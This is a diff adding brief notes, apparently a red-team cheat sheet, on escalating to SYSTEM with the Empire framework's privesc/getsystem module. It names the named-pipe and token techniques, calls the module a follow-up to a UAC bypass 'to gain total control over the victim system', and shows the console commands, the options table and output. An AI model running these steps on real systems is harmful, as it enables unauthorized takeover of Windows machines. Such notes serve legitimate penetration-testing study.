@@ -1,0 +1,33 @@
+Empire - Priviledge escalation using privesc/getsystem
+
++ getsystem module attempt to elevate to higher priviledge using these technique
+	++ pipe impersonation
+	++ token duplication
+
++ getsystem is follow up to bypass_uac module to gain total control over the victim system
+	# (Empire: DL3NCB5V) > usemodule privesc/getsystem*
+	# (Empire: powershell/privesc/getsystem) > info
+	
++ Check the option using info command and make sure agent is set to agent your want to interact
+
+Options:
+
+  Name        Required    Value                     Description
+  ----        --------    -------                   -----------
+  RevToSelf   False                                 Switch. Reverts the current thread      
+                                                    privileges.                             
+  Technique   False       NamedPipe                 Technique to use, 'NamedPipe' for       
+                                                    service named pipe impersonation or     
+                                                    'Token' for adjust token privs.         
+  Agent       True        DL3NCB5V                  Agent to run module on.                 
+  ServiceName False                                 Optional service name to used for       
+                                                    'NamedPipe' impersonation.              
+  PipeName    False                                 Optional pipe name to used for          
+                                                    'NamedPipe' impersonation.              
+  WhoAmI      False                                 Switch. Display the credentials for the 
+                                                    current PowerShell thread.              
+
+	# (Empire: powershell/privesc/getsystem) > execute
+	# [>] Module is not opsec safe, run? [y/N] y
+	# Running as: WORKGROUP\SYSTEM
+	# Get-System completed
